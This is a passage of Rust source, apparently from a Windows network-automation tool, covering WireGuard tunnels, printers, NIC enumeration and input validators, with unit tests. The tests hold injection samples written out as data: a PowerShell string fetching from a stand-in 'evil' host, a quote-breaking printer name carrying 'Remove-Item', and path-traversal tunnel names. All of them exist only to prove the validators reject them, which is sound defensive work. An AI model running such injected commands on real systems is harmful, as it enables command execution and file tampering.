        std::env::var("PROGRAMFILES(X86)")
            .map(|p| format!("{}\\WireGuard\\wireguard.exe", p))
            .unwrap_or_default(),
    ] {
        if !cand.is_empty() && std::path::Path::new(&cand).exists() {
            return cand;
        }
    }
    "wireguard.exe".to_string()
}

/// 已安装的 WireGuard 隧道名（`.conf` 文件名），给「找不到隧道」的报错用。
fn wireguard_tunnel_names() -> Vec<String> {
    let Some(dir) = wireguard_conf_dir() else {
        return Vec::new();
    };
    let Ok(rd) = std::fs::read_dir(&dir) else {
        return Vec::new();
    };
    rd.flatten()
        .filter_map(|e| {
            let p = e.path();
            (p.extension().and_then(|x| x.to_str()) == Some("conf"))
                .then(|| p.file_stem().map(|s| s.to_string_lossy().to_string()))
                .flatten()
        })
        .collect()
}

/// 隧道名会被拼成配置文件名，所以路径分隔符与 `..` 一律拒绝。
///
/// 用户在这里写的是**隧道名**，任何场合都不需要它们；放过一个 `..\..\x` 就等于让
/// 一份 config.json 能指名安装 `%PROGRAMDATA%` 之外的任意 `.conf`。
fn safe_tunnel_name(name: &str) -> Result<(), String> {
    if name.is_empty() {
        return Err(i18n::t("pal.tunnel_name_empty"));
    }
    if name
        .chars()
        .any(|c| c == '/' || c == '\\' || c == ':' || c < ' ')
        || name.contains("..")
    {
        return Err(i18n::tf("pal.tunnel_name_invalid", &[("name", name)]));
    }
    Ok(())
}

/// 安装并启动一条 WireGuard 隧道服务。
///
/// ⚠️ `wireguard.exe /installtunnelservice` 需要管理员权限；这里**不**走 UAC 通道
/// （worker 会反复调用，弹窗就成了每 N 秒一次的骚扰），失败即把系统原话报出去。
/// 另一个已知行为：该命令在某些版本会顺带拉起托盘界面而不立即退出 —— 这不会卡住
/// worker，一次 tick 有自己的等待上限（见 `automation::persistent`）。
fn connect_wireguard(tunnel: &str) -> Result<(), String> {
    safe_tunnel_name(tunnel)?;
    let dir = wireguard_conf_dir().ok_or_else(|| i18n::t("pal.no_programdata"))?;
    let conf = dir.join(format!("{}.conf", tunnel));
    if !conf.is_file() {
        let known = wireguard_tunnel_names();
        let dir_s = dir.display().to_string();
        return Err(if known.is_empty() {
            i18n::tf("pal.wg_dir_empty", &[("dir", &dir_s), ("name", tunnel)])
        } else {
            i18n::tf(
                "pal.wg_conf_missing",
                &[("name", tunnel), ("existing", &known.join(", "))],
            )
        });
    }
    let exe = wireguard_exe();
    let conf_s = conf.to_string_lossy().to_string();
    run(&exe, &["/installtunnelservice", &conf_s])
        .map(|_| ())
        .map_err(|e| {
            i18n::tf(
                "pal.wg_install_failed",
                &[("exe", &exe), ("conf", &conf_s), ("error", &e)],
            )
        })
}

/// 拨一条已存好的电话簿/VPN 连接（凭据已保存时全程无需交互）。
fn rasdial(entry: &str) -> Result<(), String> {
    run("rasdial", &[entry]).map(|_| ()).map_err(|e| {
        i18n::tf("pal.rasdial_failed", &[("entry", entry), ("error", &e)])
    })
}

// —————————————————————————— 打印机（3B1 set_default_printer） ——————————————————————————

/// 「这台机器有哪些打印机」，一台一行，`名字<TAB>True|False<TAB>备注<TAB>位置`。
///
/// 走 CIM 的 `Win32_Printer` 而不是 `Get-Printer`：本文件的读取一律走 CIM 对象
/// （语言无关、编码可控，见模块头），而 `Default` 标志本来就在这张表上，不需要再问一次。
/// 后两列只是给界面看的说明（`Comment`/`Location`），下发时仍然只用第一列。
///
/// 出错时**必须**留话：这一版之前脚本挂着 `SilentlyContinue`，Rust 侧又是
/// `.unwrap_or_default()`，于是「CIM 查询失败」和「这台机器没有打印机」在界面上长成
/// 同一个空下拉，谁也没法知道是哪一种。现在失败走 stderr + 退出码 1，由
/// [`WindowsPlatform::list_printers`] 记进日志（清单为空仍然按用户之前的决策只说
/// 「没有候选，请手输」，不弹框 —— 弹框是给自动化配置用的，不是给一次下拉刷新用的）。
const PRINTER_ROWS_PS: &str = r#"$ErrorActionPreference='Stop';
try {
$rows = @(Get-CimInstance -ClassName Win32_Printer | ForEach-Object { "$($_.Name)`t$($_.Default)`t$($_.Comment)`t$($_.Location)" })
} catch {
[Console]::Error.Write($_.Exception.Message); exit 1
}
[Console]::Out.Write(($rows -join "`n"))"#;

/// 解析 [`PRINTER_ROWS_PS`] 的行。名字为空的行丢掉 —— 那是 CIM 里没填名字的条目，
/// 选中它只会让下一次下发拿空串去找打印机。
///
/// 认一条打印机的凭据是**第二列必须是 CIM 打出来的 `True`/`False`**：报错文本、进度条
/// 之类的杂行没有这个形状，于是进不了清单（宁可少一台，不要把一句英文变成候选）。
/// 备注与位置里真出现制表符时，多出来的列一起并进标签 —— 标签只是给人看的，
/// 下发用的永远是第一列。
fn parse_printer_rows(out: &str) -> Vec<PrinterInfo> {
    out.lines()
        .filter_map(|l| {
            let mut it = l.split('\t');
            let name = it.next()?.trim();
            if name.is_empty() {
                return None;
            }
            let flag = it.next()?;
            let is_default = if flag.eq_ignore_ascii_case("True") {
                true
            } else if flag.eq_ignore_ascii_case("False") {
                false
            } else {
                return None;
            };
            // 按**列位**取值，空列不许消失：备注为空的行一旦把空列滤掉，位置就会
            // 顶上备注的位置，界面上 `前台`（Location）成了打印机的名字 ——
            // v1.0.1 用户报的「位置伪装成名字」就是这么来的。
            let mut rest = it.map(|s| s.trim());
            let comment = rest.next().unwrap_or("");
            let location = rest.collect::<Vec<_>>().join(" ");
            Some(PrinterInfo {
                name: name.to_string(),
                info: printer_label(name, comment, &location),
                is_default,
            })
        })
        .collect()
}

/// 「把 printer 设为当前用户的默认打印机」的脚本。
///
/// 名字只进 `$want` 这**一个**单引号字面量（[`psq`] 把内部的 `'` 翻倍），比较放在
/// `Where-Object` 里做。刻意不用 WQL 的 `-Filter "Name='…'"`：那是在双引号里再闭合
/// 一层单引号，多一处语法边界就多一类写错闭合的可能，而在对象上比名字没有任何代价。
///
/// 找不到那台打印机、以及 `SetDefaultPrinter` 返回非 0，都用**非 0 退出码**说话 ——
/// `ps()` 据此把系统原话变成界面上的错误，而不是「动作记成功、打印机没变」。
fn set_default_printer_script(printer: &str) -> String {
    format!(
        "$ErrorActionPreference='Stop'; \
         $want={w}; \
         $p=@(Get-CimInstance -ClassName Win32_Printer | Where-Object {{ $_.Name -eq $want }}); \
         if ($p.Count -eq 0) {{ Write-Error \"no printer named $want\"; exit 3 }} \
         $r=$p[0] | Invoke-CimMethod -MethodName SetDefaultPrinter; \
         if ($r.ReturnValue -ne 0) {{ Write-Error \"SetDefaultPrinter returned $($r.ReturnValue)\"; exit 4 }}",
        w = psq(printer)
    )
}

impl NetworkPlatform for WindowsPlatform {
    fn watch_ssid(&self, cb: Box<dyn Fn(Option<String>) + Send + Sync>) -> WatcherHandle {
        poll_ssid_watch(|| WindowsPlatform.get_current_ssid(), cb)
    }

    fn get_current_ssid(&self) -> Option<String> {
        status_cached().ssid
    }

    fn get_status(&self) -> InterfaceStatus {
        status_cached()
    }

    fn fresh_status(&self) -> InterfaceStatus {
        read_status()
    }

    fn apply_network(&self, p: &NetworkConfig) -> Result<(), String> {
        let iface = wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_adapter_hint"))?;
        exec_ops(&apply_ops(&iface, p)?)
    }

    fn set_dhcp(&self) -> Result<(), String> {
        let iface = wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_iface"))?;
        exec_ops(&[
            WinOp::SetDhcp {
                iface: iface.clone(),
            },
            WinOp::SetDns {
                iface,
                servers: Vec::new(),
            },
        ])
    }

    /// 按**适配器名**切回 DHCP（netsh 直接用 `name=` 定位，无需额外映射）。
    fn set_dhcp_for(&self, dev: &str) -> Result<(), String> {
        exec_ops(&[
            WinOp::SetDhcp {
                iface: dev.to_string(),
            },
            WinOp::SetDns {
                iface: dev.to_string(),
                servers: Vec::new(),
            },
        ])
    }

    /// 枚举当前在用的全部网卡（一次 PowerShell 取全部字段）。
    ///
    /// Windows 上「VPN 软件名」没有注册表式的公开映射，但 VPN 适配器几乎都会把
    /// 产品名写进 `InterfaceDescription`（"Tailscale Tunnel" / "TAP-Windows Adapter
    /// V9 for OpenVPN" / "Cisco AnyConnect Secure Mobility Client Virtual Miniport
    /// Adapter for Windows x64"），因此用描述文本匹配即可（见 [`super::guess_vpn_app`]）。
    fn list_interfaces(&self) -> Vec<super::NicInfo> {
        super::cached_nics(|| {
            /// 「有哪些网卡、各自现在什么状态」的脚本体。`$vpn`（关键字数组）由下面的
            /// `format!` 从 Rust 侧的同源表拼在最前面。
            ///
            /// 筛选条件是「正在用」或「认得出是 VPN 产品」：一条没连上的隧道也要出现在
            /// 清单上 —— 它的存在本身就是信息（这个软件装了，现在没连），而托盘面板与
            /// 3B2 的「维持连接」动作都要能找到它。之前只留 `Status -eq 'Up'`，于是所有
            /// 没连上的虚拟网卡一起消失了。
            ///
            /// 为什么 VPN 判据要下进 PowerShell、而不是回到 Rust 再筛：一台装过几个 VPN
            /// 客户端的机器上有十几个「未连接的非物理适配器」（WAN Miniport 一家就占满），
            /// 每张都要先问四遍地址/路由/DNS 才被丢掉，而 PowerShell 的启动开销本来就躲
            /// 不掉 —— 拉取之前筛，比拉回来再筛便宜得多。判据也不能在这里抄一份：抄了
            /// 就会有「Rust 说是 VPN、界面没显示」和反过来两种分歧。
            const NIC_ROWS_PS_BODY: &str = r#"$ErrorActionPreference='SilentlyContinue';
$list = New-Object System.Collections.Generic.List[object];
foreach ($n in @(Get-NetAdapter)) {
  $t = ("$($n.InterfaceDescription) $($n.Name)").ToLower();
  $isVpn = @($vpn | Where-Object { $t.Contains($_) }).Count -gt 0;
  if ($n.Status -ne 'Up' -and -not $isVpn) { continue };
  $idx = $n.ifIndex;
  $ip   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv4 | Where-Object { $_.IPAddress -ne '127.0.0.1' } | Select-Object -First 1;
  $v6   = Get-NetIPAddress -InterfaceIndex $idx -AddressFamily IPv6 | Where-Object { $_.SuffixOrigin -ne 'Link' -and $_.PrefixOrigin -ne 'WellKnown' } | Select-Object -First 1;
  $rt   = Get-NetRoute -InterfaceIndex $idx -AddressFamily IPv4 -DestinationPrefix '0.0.0.0/0' | Sort-Object RouteMetric | Select-Object -First 1;
  $dns  = Get-DnsClientServerAddress -InterfaceIndex $idx -AddressFamily IPv4;
  $prof = Get-NetConnectionProfile -InterfaceIndex $idx;
  $list.Add([pscustomobject]@{
    name=$n.Name; desc=$n.InterfaceDescription; mac=$n.MacAddress; media=$n.MediaType; status=$n.Status;
    ip=$ip.IPAddress; prefix=$ip.PrefixLength; v6=$v6.IPAddress; gw=$rt.NextHop;
    dns=(($dns | ForEach-Object { $_.ServerAddresses }) -join ',');
    ssid=$prof.Name;
  });
};
if ($list.Count -eq 0) { '[]' } else { $list | ConvertTo-Json -Compress }"#;

            let needles: Vec<&str> = super::VPN_APP_TABLE
                .iter()
                .map(|(needle, _)| *needle)
                .collect();
            let script = format!("$vpn={};\n{}", ps_arr(&needles), NIC_ROWS_PS_BODY);

            let raw = match ps(&script) {
                Ok(o) => o,
                Err(_) => return Vec::new(),
            };
            let Ok(v) = serde_json::from_str::<serde_json::Value>(raw.trim()) else {
                return Vec::new();
            };
            // 单张网卡时 PowerShell 会把数组退化为对象，统一成数组处理
            let rows: Vec<&serde_json::Value> = match &v {
                serde_json::Value::Array(a) => a.iter().collect(),
                other => vec![other],
            };

            let mut out: Vec<super::NicInfo> = rows.into_iter().filter_map(nic_from_row).collect();

            let rank = |k: super::NicKind| match k {
                super::NicKind::Wireless => 0,
                super::NicKind::Wired => 1,
                super::NicKind::Vpn => 2,
                super::NicKind::Other => 3,
            };
            out.sort_by(|a, b| rank(a.kind).cmp(&rank(b.kind)).then_with(|| a.name.cmp(&b.name)));
            out
        })
    }

    fn probe(&self, target: &ProbeTarget, timeout_ms: u64) -> Health {
        use crate::config::ProbeMode;
        // Windows ping：-n 次数，-w 超时(毫秒)
        let icmp = || -> bool {
            let t = target.icmp_target.as_deref().unwrap_or("223.5.5.5");
            let ms = timeout_ms.max(1000).to_string();
            run("ping", &["-n", "1", "-w", &ms, t]).is_ok()
        };
        // curl.exe 自 Windows 10 1803 起内置
        let http = || -> bool {
            let url = match target.http_target.as_deref() {
                Some(u) if !u.is_empty() => u,
                _ => return false,
            };
            let secs = timeout_secs(timeout_ms);
            match run(
                "curl.exe",
                &[
                    "-sS", "-m", &secs, "-o", "NUL", "-w", "%{http_code}", url,
                ],
            ) {
                Ok(code) => matches!(code.trim().parse::<u16>(), Ok(c) if (200..400).contains(&c)),
                Err(_) => false,
            }
        };

        let dead = match target.mode {
            ProbeMode::Icmp => !icmp(),
            ProbeMode::Http => !http(),
            // both：两端同时失败才判死
            ProbeMode::Both => !(icmp() || http()),
        };
        if dead {
            Health::Fail
        } else {
            Health::Ok
        }
    }

    fn tunnel_is_up(&self, target: &TunnelTarget) -> bool {
        match win_adapter(target) {
            // 厂商提示在这里参与判定：Windows 看得见适配器描述，「名字对但厂商错」
            // 就该继续判为未连接，由 tunnel_connect 去解释
            Some(a) => a.up && a.provider_matched,
            None => false,
        }
    }

    /// ⚠️ 不提权：worker 每 N 秒就来一次，走 UAC 等于把桌面钉在授权弹窗上。
    /// Windows 上「装一条 WireGuard 隧道服务」本身就需要管理员权限，这里不假装能绕过，
    /// 而是把系统的原话交给界面 —— 用户看到就知道该手动做一次。
    fn tunnel_connect(&self, target: &TunnelTarget) -> Result<(), String> {
        let name = target.name();
        match win_adapter(target) {
            Some(a) if !a.provider_matched => Err(i18n::tf(
                "pal.iface_provider_mismatch",
                &[
                    ("name", &a.name),
                    ("desc", &a.desc),
                    ("provider", target.provider().unwrap_or("")),
                ],
            )),
            Some(a) if a.up => Ok(()),
            Some(_) => match target {
                TunnelTarget::WireGuard { .. } => connect_wireguard(name),
                TunnelTarget::Vpn { .. } => rasdial(name),
            },
            None => {
                let installed = wireguard_tunnel_names();
                if !installed.is_empty() {
                    Err(i18n::tf(
                        "pal.iface_missing_wg",
                        &[("name", name), ("conns", &installed.join(", "))],
                    ))
                } else {
                    Err(i18n::tf("pal.iface_missing_none", &[("name", name)]))
                }
            }
        }
    }

    fn add_route(&self, dest: &str, gw: &str, metric: u32) -> Result<(), String> {
        let iface = wifi_iface().ok_or_else(|| i18n::t("pal.no_wifi_iface"))?;
        exec_ops(&[WinOp::RouteAdd {
            iface,
            dest: dest.to_string(),
            gw: Some(gw.to_string()),
            metric,
        }])
    }

    fn delete_route(&self, dest: &str) -> Result<(), String> {
        exec_ops(&[WinOp::RouteDelete {
            dest: dest.to_string(),
        }])
    }

    fn launch_app(&self, app: &str, args: &[String]) -> Result<(), String> {
        let arg_list = if args.is_empty() {
            String::new()
        } else {
            let refs: Vec<&str> = args.iter().map(|s| s.as_str()).collect();
            format!(" -ArgumentList {}", ps_exec_arr(&refs))
        };
        // 走 PowerShell 的 Start-Process（不带 -Wait）：能起 exe / .lnk / 文档路径 / 协议，
        // 而且「起不来」会真的抛错。返回 0 的含义是**进程已经创建**，不是「应用还活着」——
        // 应用随后自己退出，这里也无从得知（三平台的 `launch_app` 都只到这个程度）。
        let script = format!(
            "$ErrorActionPreference='Stop'; Start-Process -FilePath {}{} | Out-Null",
            psq(app),
            arg_list
        );
        ps(&script).map(|_| ())
    }

    fn run_script(&self, path: &str, args: &[String], elevated: bool) -> Result<(), String> {
        // 按扩展名决定解释器：.ps1 → PowerShell；.bat/.cmd → cmd；其余直接执行
        let lower = path.to_ascii_lowercase();
        let (file, all_args): (String, Vec<String>) = if lower.ends_with(".ps1") {
            let mut a = vec![
                "-NoProfile".to_string(),
                "-ExecutionPolicy".to_string(),
                "Bypass".to_string(),
                "-File".to_string(),
                path.to_string(),
            ];
            a.extend(args.iter().cloned());
            ("powershell.exe".to_string(), a)
        } else if lower.ends_with(".bat") || lower.ends_with(".cmd") {
            let mut a = vec!["/c".to_string(), path.to_string()];
            a.extend(args.iter().cloned());
            ("cmd.exe".to_string(), a)
        } else {
            (path.to_string(), args.to_vec())
        };

        if elevated {
            // 用户脚本提权：显式走 UAC，确保用户每次知情（与网络配置操作区别对待），
            // 而且**只弹一次** —— 见 [`run_elevated_target`]。
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            run_elevated_target(&file, &refs)
        } else {
            let refs: Vec<&str> = all_args.iter().map(|s| s.as_str()).collect();
            run(&file, &refs).map(|_| ())
        }
    }

    fn list_known_ssids(&self) -> Option<Vec<String>> {
        // 直接读 WLAN 配置 XML（`[xml]` 解析），语言无关且编码正确；
        // 比解析 `netsh wlan show profiles` 的本地化文本可靠得多。
        let script = r#"$ErrorActionPreference='SilentlyContinue';
$d = Join-Path $env:ProgramData 'Microsoft\Wlansvc\Profiles\Interfaces';
if (-not (Test-Path $d)) { exit }
$names = Get-ChildItem -Path $d -Recurse -Filter *.xml -ErrorAction SilentlyContinue | ForEach-Object {
  try { ([xml][System.IO.File]::ReadAllText($_.FullName)).WLANProfile.name } catch { }
} | Where-Object { $_ } | Sort-Object -Unique;
[Console]::Out.Write(($names -join "`n"))"#;
        let out = ps(script).ok()?;
        let list: Vec<String> = out
            .lines()
            .map(|l| l.trim().to_string())
            .filter(|l| !l.is_empty())
            .collect();
        if list.is_empty() {
            None
        } else {
            Some(list)
        }
    }

    fn list_printers(&self) -> Vec<PrinterInfo> {
        match ps(PRINTER_ROWS_PS) {
            Ok(out) => parse_printer_rows(&out),
            Err(e) => {
                // 空下拉对用户说的是「没有打印机」，而真实原因可能是 CIM 查不动 ——
                // 这个区别只在日志里留得下，所以按用户既有的决策不弹框，只记一条。
                crate::log::warn(&i18n::tf("logs.printers_failed", &[("error", &e)]));
                Vec::new()
            }
        }
    }

    fn set_default_printer(&self, printer: &str) -> Result<(), String> {
        // `SetDefaultPrinter` 是**每用户**的设置，不需要管理员 —— 与 macOS/Linux 侧
        // 刻意选 `lpoptions -d` 是同一个决策：这个动作每次进入 Active 都会跑。
        ps(&set_default_printer_script(printer)).map(|_| ())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    /// CIM 打的是 .NET 布尔的 `True` / `False`；名字里带空格与反斜杠（网络共享打印机）
    /// 都必须原样留着 —— 那是用户接下来要写进配置里、下次下发要拿去找打印机的字符串。
    #[test]
    fn printer_rows_keep_the_exact_name_and_only_one_default() {
        let rows = parse_printer_rows(
            "Microsoft Print to PDF\tFalse\t\t\nHP OfficeJet Pro 476\tTrue\t476 on 3F\tOffice\n\\\\filesrv\\Lobby\tFalse\t\t前台\n",
        );
        assert_eq!(rows.len(), 3);
        assert_eq!(rows[1].name, "HP OfficeJet Pro 476");
        assert!(rows[1].is_default);
        assert!(!rows[0].is_default);
        assert_eq!(rows[2].name, r"\\filesrv\Lobby");
        assert!(!rows[2].is_default);
        // 备注与位置只给人看，队列名才是下发用的
        assert_eq!(rows[1].info.as_deref(), Some("476 on 3F · Office"));
        // 没有备注的那台：位置不能单独当名字，否则看着像另一台机器冒出来了
        assert_eq!(rows[2].info.as_deref(), Some(r"\\filesrv\Lobby · 前台"));
        assert_eq!(rows[0].info, None);
        // 没有 `\t` 的行（PowerShell 报错文本混进来时）与空名字的行都不该变成一条打印机
        assert!(parse_printer_rows("Get-CimInstance : Access denied\n\tTrue\n").is_empty());
        // 第二列不是 CIM 的布尔 → 这一行不是打印机
        assert!(parse_printer_rows("Some header column\tmaybe\t\n").is_empty());
    }

    /// 网卡行的取舍规则。这条钉住的是用户报的那个现象：**没连上的虚拟网卡整批消失**
    /// （脚本按 `Status -eq 'Up'` 筛完，Rust 又要求「有 IPv4」）。
    ///
    /// 夹具刻意不带 `gw`：那一列会让我们去跑一次 `arp -a`，测试不该依赖邻居表。
    #[test]
    fn a_row_without_an_ipv4_still_counts_when_it_is_a_tunnel_or_has_some_address() {
        use serde_json::json;

        let wifi = nic_from_row(&json!({
            "name": "Wi-Fi", "desc": "Intel(R) Wi-Fi 6E AX211 160MHz",
            "status": "Up", "media": "Native 802.11", "ip": "192.168.1.23", "ssid": "Office_5G"
        }))
        .expect("在用的 Wi-Fi 必须在清单上");
        assert_eq!(wifi.kind, super::super::NicKind::Wireless);
        assert!(wifi.up);
        assert_eq!(wifi.ssid.as_deref(), Some("Office_5G"));

        // 没连上的隧道：一条地址都没有，但「装了没连」本身就是要看的信息
        let off = nic_from_row(&json!({
            "name": "Tailscale", "desc": "Tailscale Tunnel", "status": "Disconnected"
        }))
        .expect("未连接的 VPN 隧道也要列出来");
        assert_eq!(off.kind, super::super::NicKind::Vpn);
        assert!(!off.up, "状态要原样带出来，不能假称在用");
        assert_eq!(off.app.as_deref(), Some("Tailscale"));

        // IPv6-only：曾经因为「没有 IPv4」被丢掉
        let v6only = nic_from_row(&json!({
            "name": "Ethernet", "desc": "Realtek Gaming 2.5GbE", "status": "Up",
            "media": "802.3", "v6": "2001:db8::1"
        }))
        .expect("只有全局 IPv6 的网卡也是在用的");
        assert_eq!(v6only.ipv6.as_deref(), Some("2001:db8::1"));

        // 没有地址、又不是隧道的行（WAN Miniport 那一类）不该占位
        assert!(nic_from_row(&json!({
            "name": "WAN Miniport (IP)", "desc": "WAN Miniport (IP)", "status": "Disconnected"
        }))
        .is_none());
        // 连名字都没有的行不是网卡，是脚本没吐全
        assert!(nic_from_row(&json!({ "status": "Up", "ip": "10.0.0.2" })).is_none());
    }

    /// 打印机名是一段自由文本，而这里要把它交进一段 PowerShell 里。它只能出现在
    /// `$want` 那一个单引号字面量内，且内部的 `'` 必须被翻倍 —— 否则一份 config.json
    /// 就是任意命令执行。
    #[test]
    fn a_printer_name_cannot_close_its_own_quotes() {
        let s = set_default_printer_script(r"O'Brien's 'HP; Remove-Item x");
        assert!(s.contains(r"$want='O''Brien''s ''HP; Remove-Item x';"), "{s}");
        // 比较是在对象上做的，不是拼进 WQL 的 -Filter
        assert!(!s.contains("-Filter"), "{s}");
        assert!(s.contains("-eq $want"), "{s}");
        // 两种失败都得用非 0 退出码说话，否则「打印机没换成」会被记成动作成功
        assert!(s.contains("exit 3") && s.contains("exit 4"), "{s}");
    }

    /// 两个数组构造器**故意**长得不一样，这条测试就是不让它们被"顺手统一"掉：
    /// `& netsh.exe @(...)` 由 PowerShell 自己补引号，而 `Start-Process -ArgumentList @(...)`
    /// 只是把元素用空格拼成一条命令行 —— 那边重复加引号会改变参数，不加引号会把带空格的路径拆开。
    #[test]
    fn start_process_arguments_carry_their_own_shell_quotes() {
        assert_eq!(ps_arr(&["/c", r"C:\a b.bat", "-z"]), r"@('/c','C:\a b.bat','-z')");
        assert_eq!(
            ps_exec_arr(&["/c", r"C:\a b.bat", "-z"]),
            r#"@('/c','"C:\a b.bat"','-z')"#
        );
        // 不带空白的元素不该被多包一层（netsh 一类工具会把引号算进值里）
        assert_eq!(ps_exec_arr(&["name=Wi-Fi"]), "@('name=Wi-Fi')");
    }

    #[test]
    fn prefix_len_accepts_integers_only() {
        assert_eq!(parse_prefix_len("64").unwrap(), "64");
        assert_eq!(parse_prefix_len(" 8 ").unwrap(), "8");
        assert_eq!(parse_prefix_len("0").unwrap(), "0");
        assert_eq!(parse_prefix_len("128").unwrap(), "128");
    }

    #[test]
    fn prefix_len_rejects_injection_and_out_of_range() {
        // 关键：这些一旦原样进 `-PrefixLength`，等价于 PowerShell 语句注入
        for bad in [
            "64; Invoke-WebRequest http://evil/x",
            "64\nGet-Process",
            "64$(calc)",
            "",
            "abc",
            "129",
            "-1",
        ] {
            assert!(parse_prefix_len(bad).is_err(), "accepted bad prefix: {:?}", bad);
        }
    }

    /// 回归：网关 `192.168.1.1` 绝不能命中本机地址 `192.168.1.10` 所在的行。
    ///
    /// arp 的接口表头正是「接口: <本机IP> --- 0x10」这种纯中文行；旧实现用
    /// `line.contains(gw)`，于是它被拉进 MAC 扫描 —— 装完即退就是它触发的。
    #[test]
    fn ip_token_match_rejects_prefix_hits() {
        let header = "\u{fffd}\u{fffd}: 192.168.1.10 --- 0x10";
        assert!(!super::has_ip_token(header, "192.168.1.1")); // 前缀不得命中
        assert!(super::has_ip_token(header, "192.168.1.10")); // 完整才命中

        let row = "  192.168.1.1           e8-84-c6-93-ad-eb     \u{fffd}\u{fffd}";
        assert!(super::has_ip_token(row, "192.168.1.1"));
        assert!(!super::has_ip_token(row, "192.168.1.11"));
        assert!(!super::has_ip_token(row, "192.168.1"));
        assert!(!super::has_ip_token(row, "")); // 空网关不得命中每一行
    }

    /// 端到端：网关所在行必须真的解析出 MAC（Windows `arp -a` 用短横线分隔）。
    #[test]
    fn gateway_row_yields_dash_separated_mac() {
        let row = "  192.168.1.1           e8-84-c6-93-ad-eb     \u{fffd}\u{fffd}        ";
        assert!(super::has_ip_token(row, "192.168.1.1"));
        assert_eq!(
            super::super::extract_mac(row).as_deref(),
            Some("e8-84-c6-93-ad-eb")
        );
    }

    /// 适配器行的第三段可以含 `|`：描述里出现竖线不该把这一行切成四截。
    #[test]
    fn adapter_rows_keep_the_description_intact() {
        let rows = parse_adapter_lines(
            "Wi-Fi|Up|Intel(R) Wi-Fi 6 AX201\nOffice-WG|Disconnected|WireGuard_TUN\n|Up|ghost\n",
        );
        assert_eq!(rows.len(), 2, "名字为空的行不是网卡");
        assert_eq!(rows[0], ("Wi-Fi".into(), "Up".into(), "Intel(R) Wi-Fi 6 AX201".into()));
        assert_eq!(rows[1].1, "Disconnected", "状态原样保留，判定留给调用方");
    }

    fn cfg(mode: Mode, dns: Option<&str>) -> NetworkConfig {
        NetworkConfig {
            mode,
            ip: Some("192.168.1.100".into()),
            netmask: Some("255.255.255.0".into()),
            gateway: Some("192.168.1.1".into()),
            dns: dns.map(Into::into),
            ..Default::default()
        }
    }

    /// 编辑器表达「DNS 保持不变」的方式是把 `dns` 键整个删掉，所以缺键必须一条
    /// `dnsservers` 都不产生 —— 否则「保持不变」实际上是把网卡打回 DHCP 下发。
    #[test]
    fn an_absent_dns_key_compiles_to_no_dns_operation() {
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, None)).unwrap();
        assert_eq!(
            ops,
            vec![WinOp::SetManual {
                iface: "Wi-Fi".into(),
                ip: "192.168.1.100".into(),
                mask: "255.255.255.0".into(),
                gw: "192.168.1.1".into(),
            }],
            "缺 dns 键只该下发地址本身"
        );
        assert_eq!(
            apply_ops("Wi-Fi", &cfg(Mode::Dhcp, None)).unwrap(),
            vec![WinOp::SetDhcp { iface: "Wi-Fi".into() }]
        );
    }

    /// 与上一个用例只差一个 `Some`：空串是一条真实的清空指令。
    #[test]
    fn an_empty_dns_string_still_clears_the_adapter() {
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, Some(""))).unwrap();
        assert!(ops.contains(&WinOp::SetDns {
            iface: "Wi-Fi".into(),
            servers: vec![]
        }));
        let clear = ops
            .iter()
            .find(|o| matches!(o, WinOp::SetDns { .. }))
            .unwrap()
            .render();
        assert!(
            clear.contains("source=dhcp"),
            "清空要真的下发 source=dhcp，而不是省掉这条: {}",
            clear
        );
        let ops = apply_ops("Wi-Fi", &cfg(Mode::Manual, Some(" 8.8.8.8 ,1.1.1.1, "))).unwrap();
        assert!(ops.contains(&WinOp::SetDns {
            iface: "Wi-Fi".into(),
            servers: vec!["8.8.8.8".into(), "1.1.1.1".into()],
        }));
    }

    /// 隧道名会拼成 `%PROGRAMDATA%\\WireGuard\\WiredTunnels\\<name>.conf`，
    /// 所以路径分隔符一个都不能放过。
    #[test]
    fn tunnel_names_carry_no_path() {
        assert!(safe_tunnel_name("Office-WG").is_ok());
        for bad in ["", "..", "..\\..\\windows\\evil", "a/b", "C:\\x", "a\0b"] {
            assert!(safe_tunnel_name(bad).is_err(), "{:?} 不该被当成隧道名", bad);
        }
    }
}
